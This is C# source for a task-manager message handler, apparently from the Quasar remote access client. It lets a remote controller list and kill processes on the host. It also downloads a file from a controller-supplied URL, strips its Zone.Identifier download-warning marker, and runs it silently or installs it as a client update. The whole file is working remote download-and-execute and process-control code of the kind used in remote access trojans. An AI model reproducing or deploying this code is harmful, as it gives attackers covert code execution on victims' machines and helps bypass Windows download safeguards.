using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with tasks.
    /// </summary>
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly QuasarClient _client;

        private readonly WebClient _webClient;

        public TaskManagerHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                             message is DoProcessStart ||
                                                             message is DoProcessEnd;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle
                };
                processes[i] = process;
            }

            client.Send(new GetProcessesResponse { Processes = processes });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            if (string.IsNullOrEmpty(message.FilePath))
            {
                // download and then execute
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
                    return;
                }

                message.FilePath = FileHelper.GetTempFilePath(".exe");

                try
                {
                    if (_webClient.IsBusy)
                    {
                        _webClient.CancelAsync();
                        while (_webClient.IsBusy)
                        {
                            Thread.Sleep(50);
                        }
                    }

                    _webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, message);
                }
                catch
                {
                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
                    NativeMethods.DeleteFile(message.FilePath);
                }
            }
            else
            {
                // execute locally
                ExecuteProcess(message.FilePath, message.IsUpdate);
            }
        }

        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            var message = (DoProcessStart) e.UserState;
            if (e.Cancelled)
            {
                NativeMethods.DeleteFile(message.FilePath);
                return;
            }

            FileHelper.DeleteZoneIdentifier(message.FilePath);
            ExecuteProcess(message.FilePath, message.IsUpdate);
        }

        private void ExecuteProcess(string filePath, bool isUpdate)
        {
            if (isUpdate)
            {
                try
                {
                    var clientUpdater = new ClientUpdater();
                    clientUpdater.Update(filePath);
                    _client.Exit();
                }
                catch (Exception ex)
                {
                    NativeMethods.DeleteFile(filePath);
                    _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                }
            }
            else
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        UseShellExecute = true,
                        FileName = filePath
                    };
                    Process.Start(startInfo);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                }
                catch (Exception)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }

            }
        }

        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadFileCompleted -= OnDownloadFileCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
